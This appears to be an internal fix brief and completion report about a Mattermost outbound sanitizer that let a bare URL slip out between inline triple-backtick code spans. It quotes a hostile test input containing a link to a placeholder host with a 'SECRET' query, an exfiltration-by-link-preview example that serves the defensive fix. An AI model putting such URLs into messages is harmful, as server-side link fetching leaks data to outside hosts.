# FIX-198: A bare URL survives the Mattermost outbound pipeline between two inline triple-backtick runs on one line (security, D-270)

## Goal
This is security-relevant and in the same family as **FIX-197**: the sanitizer's idea of what is code disagrees with Mattermost's renderer. The same worker does both briefs together (see Placement).

The CI Watcher reported it on 2026-11-21. It failed in CI run 44819722564 on master 74a1bba6, job 136580958912, shard rust-test (1). That commit already contains FIX-195 (befa713c), so this case is still open after it.

- Test: `aurora-connector-mattermost::hostile_pipeline::hostile_text_reaches_mattermost_without_images_bad_links_or_code_broadcasts`.
- Property: "a bare URL is left (the server would fetch it)" (`hostile_pipeline.rs:506`).

Minimal input:

```
|a|b|\n|-|-|\n|1|![x](u)| <details><summary>s</summary>b</details> !<a href="https://a.example/p.png">x</a> ```rs\nlet x = 1;\n``` see https://e.example/?d=SECRET now ```rs\nlet x = 1;\n```
```

Output:

```
|a|b|\n|-|-|\n|1|🖼 x\\| \n\n\n\n**s**\n\nb\n\n !\u{200b}[x](https://a.example/p.png) ```rs\nlet x = 1;\n``` see https://e.example/?d=SECRET now ```rs\nlet x = 1;\n```
```

The sanitizer treats `see https://e.example/?d=SECRET now` as code, because it sits between two ```` ```rs ```` runs that do not start a line. In Mattermost these are inline triple-backtick code spans, not fences. The first span closes at the ```` ``` ```` before "see", so the URL is plain text and gets auto-linked, which is the path to fetching and leaking data. The `<details>` and `<a>` rewrite that runs first also leaves the table cell as `🖼 x\\|` followed by blank lines, which changes how the rest of the line is split.

The seed is `cc 0bd2ab2dc350131c9e3d4837700ac9f32a524e95bf03412ea84d68eeb9796b9d`. Add it to `connectors/mattermost/tests/hostile_pipeline.proptest-regressions` **in the same commit as the fix**.

## Change
1. Confirm the cause in the Completion report. Two candidates:
   - fence detection that accepts a backtick run which does not start a line, where CommonMark only opens a fence at the start of a line, after at most three spaces of indentation;
   - the HTML rewrite reshaping the line before code is detected.
2. Fix it with FIX-197's change. The sanitizer decides fences and code spans the way Mattermost's renderer does: fences only at the start of a line, and inline spans by run length. Where it cannot be sure, it treats the text as **not** code and defangs URLs and image or link openers.
3. Check what the `<details>`/`<summary>`/`<a>` rewrite does to a following table cell (the `\\|` and the blank lines), and that it can never move text in or out of code.
4. Never weaken a check or the property; the last line of defence stays unchanged.

## Completion report
Lane B (`alexiri/p5-polish-b`), one change with FIX-197 (its report has the shared fix in full).

**Cause (confirmed): the second suspect, the HTML rewrite reshaping the line.** It was not fence detection. No
reader in the pipeline opens a fence in the middle of a line (pulldown-cmark, like CommonMark, opens one only at
a line start after ≤ 3 spaces). A run whose info string holds a backtick opens none either.

- **The core.** The first line `|1|![x](u)| <details>… ```rs` is a table row. Under GFM the next lines are rows of
  the same table: `let x = 1;`, then ```` ``` see https://e.example/?d=SECRET now ```rs ````. That line is no fence
  opener, because its info string holds backticks. On that one-line row the two triple runs pair, so the URL is a
  code span, and the core rightly leaves it as typed. The last ```` ``` ```` line opens a fence and ends the table.
- **The connector.** It converts the inline `<details><summary>s</summary>b</details>` *inside the cell* to
  `\n\n**s**\n\nb\n\n`. The blank lines end the table. The rest of the row is a paragraph of four lines, where
  the triple run at the end of line 1 pairs with the one that starts line 3. So
  `see https://e.example/?d=SECRET now` is prose there: a bare URL, which the server fetches.
- **The `\|`** in `🖼 x\|` is FIX-142's extra-cell escaping: the row has three cells against two columns. It is
  correct and plays no part.

**Fix.**
1. FIX-197's `defang_prose` on the converted text. Whatever the final post reads as prose is defanged: the URL
   becomes `[url](url)`. This holds for every way a conversion can move text out of code. It is the
   guarantee.
2. `convert.rs`: a tag converted inside a table cell keeps the row on one line. Line breaks in its Markdown
   (`<details>`, `<summary>`, `<p>`, `<br>`, `<li>`, `<h1>`… all write `\n`) become spaces. The table, its rows
   and their code spans then stay as the core read them, and the content stays in its cell. So the conversion no
   longer moves text in or out of code there, and a `<details>` in a cell no longer breaks the table it is in.

The last line of defence is unchanged.
